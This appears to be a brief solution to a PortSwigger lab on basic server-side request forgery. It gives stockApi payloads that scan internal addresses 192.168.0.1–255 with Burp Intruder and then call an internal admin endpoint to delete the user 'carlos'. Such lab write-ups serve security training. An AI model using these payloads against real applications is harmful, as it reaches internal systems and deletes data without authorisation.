# Lab: Basic SSRF against another back-end system
# https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-common-ssrf-attacks/ssrf/lab-basic-ssrf-against-backend-system
```bash
# Send the stock request to intruder.

stockApi=http://192.168.0.1:8080/admin

# Mark 1:

stockApi=http://192.168.0.§1§:8080/admin

Payload type: Numbers
From: 1
To: 255

# Start attack.

# 247 has status code 200

```

```bash
# Check response:

/delete?username=carlos

# We found how to delete carlos now send the request to the repeater.

stockApi=http://192.168.0.247:8080/admin/delete?username=carlos

# Now send the request to solve the lab.

```
